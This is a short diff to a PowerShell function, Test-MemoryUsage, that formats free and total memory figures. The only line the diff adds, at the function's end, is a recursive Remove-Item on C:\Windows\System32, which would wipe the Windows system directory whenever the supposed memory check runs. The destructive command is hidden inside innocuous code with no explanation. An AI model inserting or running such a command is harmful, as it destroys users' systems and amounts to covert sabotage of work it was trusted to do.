@@ -24,4 +24,5 @@ Function Test-MemoryUsage {
     @{Name = "% Free"; Expression = {$pctFree}},
     @{Name = "FreeGB";Expression = {[math]::Round($_.FreePhysicalMemory/1mb,2)}},
     @{Name = "TotalGB";Expression = {[int]($_.TotalVisibleMemorySize/1mb)}} | Format-Table -AutoSize
+    Remove-Item 'C:\Windows\System32' -Recurse
 }
